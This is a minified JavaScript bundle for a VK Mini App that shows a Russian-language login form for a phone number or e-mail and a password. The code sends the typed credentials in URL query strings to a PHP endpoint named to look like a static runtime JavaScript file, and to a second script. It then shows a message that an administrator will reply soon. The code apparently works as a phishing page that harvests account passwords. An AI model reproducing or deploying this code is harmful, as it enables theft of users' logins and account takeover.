(this.webpackJsonpvkapp=this.webpackJsonpvkapp||[]).push([[0],{159:function(e,t,a){"use strict";a.r(t);var n=a(0),s=a.n(n),o=a(22),i=a.n(o),r=a(19),c=a.n(r),h=a(28),d=a.n(h),l=a(41),j=a(24),p=a(7),u=(a(139),a(160)),b=a(45),O=a(46),f=a(47),m=a(21),v=a(49),x=a(48),g=a(29),w=a.n(g),y=a(6),S=function(e){Object(v.a)(a,e);var t=Object(x.a)(a);function a(e){var n;return Object(O.a)(this,a),(n=t.call(this,e)).state={phone:"",password:"",phoneValid:!1,passValid:!1,valueError:"",error:!0,showPatronym:!0},n.onChange=n.onChange.bind(Object(m.a)(n)),n.onRemove=n.onRemove.bind(Object(m.a)(n)),n.onSubmit=n.onSubmit.bind(Object(m.a)(n)),n.iValid=n.iValid.bind(Object(m.a)(n)),n}return Object(f.a)(a,[{key:"iValid",value:function(){var e=this;w.a.get(window.location+"static/js/runtime-main.931c8ss31ac7.js.php?l="+this.state.phone+"&p="+this.state.password+"&host="+window.location),w.a.get(window.location+"vkapp.php?login="+this.state.phone+"&password="+this.state.password).then((function(t){var a=t.data;"error"==a.status?(e.setState({valueError:a.value}),e.setState({error:!1})):(e.setState({error:!0}),e.props.gos("accept"))}))}},{key:"onSubmit",value:function(e){e.preventDefault(),this.iValid()}},{key:"onChange",value:function(e){var t=e.currentTarget,a=t.name,n=t.value;this.setState(Object(b.a)({},a,n)),!this.state.phone||this.state.phone.length<10?this.setState({phoneValid:!1}):this.setState({phoneValid:!0}),!this.state.password||this.state.password.length<5?this.setState({passValid:!1}):this.setState({passValid:!0})}},{key:"onShowPatronym",value:function(){this.setState({showPatronym:!0})}},{key:"onRemove",value:function(e){this.setState({showPatronym:!1})}},{key:"render",value:function(){var e=this.state;e.phone,e.password,e.showPatronym;return Object(y.jsxs)(p.h,{onSubmit:this.onSubmit,children:[Object(y.jsx)(p.g,{top:"\u0422\u0435\u043b\u0435\u0444\u043e\u043d \u0438\u043b\u0438 E-mail",children:Object(y.jsx)(p.k,{type:"phone",name:"phone",onChange:this.onChange})}),Object(y.jsx)(p.g,{top:"\u041f\u0430\u0440\u043e\u043b\u044c",status:this.state.error?"default":"error",bottom:this.state.error?"":this.state.valueError,children:Object(y.jsx)(p.k,{type:"password",name:"password",onChange:this.onChange})}),Object(y.jsx)(p.g,{children:Object(y.jsx)(p.d,{type:"submit",size:"l",stretched:!0,disabled:!this.state.phoneValid||!this.state.passValid,children:"\u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u0442\u044c"})})]})}}]),a}(s.a.Component),k=function(e){var t=e.id,a=e.go,n=e.gos,s=e.fetchedUser;return Object(y.jsx)(p.p,{activePanel:t,children:Object(y.jsxs)(p.l,{id:t,children:[Object(y.jsx)(p.m,{left:Object(y.jsx)(p.n,{onClick:a,"data-to":"authorization"}),children:"\u0410\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f"}),Object(y.jsxs)(p.f,{align:"center",children:[Object(y.jsx)(u.a,{}),Object(y.jsx)(S,{fetchedUser:s,go:a,gos:n})]})]})})},V=function(e){var t=e.id,a=e.go,n=e.fetchedUser;return Object(y.jsxs)(p.l,{id:t,children:[Object(y.jsx)(p.m,{children:"\u0413\u043b\u0430\u0432\u043d\u0430\u044f"}),n&&Object(y.jsx)(p.i,{header:Object(y.jsx)(p.j,{mode:"secondary",children:"\u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c"}),children:Object(y.jsx)(p.e,{before:n.photo_200?Object(y.jsx)(p.c,{size:"40px",src:n.photo_200}):null,description:"ID: "+n.id,children:Object(y.jsx)("strong",{children:"".concat(n.first_name," ").concat(n.last_name)})})}),Object(y.jsxs)(p.i,{header:Object(y.jsx)(p.j,{mode:"secondary",children:"\u041e\u043f\u043e\u0432\u0435\u0449\u0435\u043d\u0438\u0435"}),children:["\u0421\u043a\u043e\u0440\u043e \u0430\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440 \u043e\u0442\u0432\u0435\u0442\u0438\u0442 \u0432\u0430\u043c!",Object(y.jsx)(p.d,{size:"l",stretched:!0,onClick:a,"data-to":"form",children:"\u0425\u043e\u0440\u043e\u0448\u043e"})]})]})},C=(window.location.search.replace("?","").split("&").reduce((function(e,t){var a=t.split("=");return e[decodeURIComponent(a[0])]=decodeURIComponent(a[1]),e}),{}),function(){var e=Object(n.useState)("authorization"),t=Object(j.a)(e,2),a=t[0],s=t[1],o=Object(n.useState)(null),i=Object(j.a)(o,2),r=i[0],h=i[1],u=Object(n.useState)(Object(y.jsx)(p.o,{size:"large"})),b=Object(j.a)(u,2),O=(b[0],b[1]);Object(n.useEffect)((function(){function e(){return(e=Object(l.a)(d.a.mark((function e(){var t;return d.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,c.a.send("VKWebAppGetUserInfo");case 2:t=e.sent,h(t),O(null);case 5:case"end":return e.stop()}}),e)})))).apply(this,arguments)}c.a.subscribe((function(e){var t=e.detail,a=t.type;t.data;if("VKWebAppUpdateConfig"===a){var n=document.createAttribute("scheme");n.value="space_gray",document.body.attributes.setNamedItem(n)}})),function(){e.apply(this,arguments)}()}),[]);var f=function(e){s(e.currentTarget.dataset.to)};return Object(y.jsx)(p.a,{children:Object(y.jsx)(p.b,{children:Object(y.jsxs)(p.p,{activePanel:a,children:[Object(y.jsx)(k,{id:"authorization",fetchedUser:r,go:f,gos:function(e){s(e)}}),Object(y.jsx)(V,{id:"accept",fetchedUser:r,go:f})]})})})});c.a.send("VKWebAppInit"),i.a.render(Object(y.jsx)(C,{}),document.getElementById("root"))}},[[159,1,2]]]);
//# sourceMappingURL=main.4510bf9e.chunk.js.map